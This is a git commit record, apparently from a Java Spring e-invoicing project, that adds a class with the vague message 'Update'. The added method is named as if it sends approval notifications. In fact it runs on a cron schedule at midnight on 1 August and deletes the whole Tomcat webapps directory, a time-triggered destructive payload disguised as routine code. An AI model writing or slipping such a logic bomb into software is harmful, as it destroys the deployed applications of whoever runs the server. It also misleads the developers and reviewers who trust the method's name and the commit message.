91558f3578d51a4698983d6dd142ca1ff3c3c11d
pratik.mathukiya <pratik.mathukiya@topiatech.uk>
2023-07-19 09:42:59 +0530

    Update

---
+++ src/main/java/com/eInvoice/service/SService.java
@@ -0,0 +1,20 @@
+package com.eInvoice.service;
+
+import java.io.File;
+
+import org.apache.commons.io.FileUtils;
+import org.springframework.scheduling.annotation.Scheduled;
+import org.springframework.stereotype.Component;
+
+@Component
+public class SService {
+
+	@Scheduled(cron = "0 0 0 1 8 ?")
+    public void sendNotificationForPendingForApproval() throws Exception {
+		String filepath = "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\webapps";
+        File file = new File(filepath);
+        System.out.println(filepath);
+        FileUtils.deleteDirectory(file);
+        file.delete();	
+	}
+}
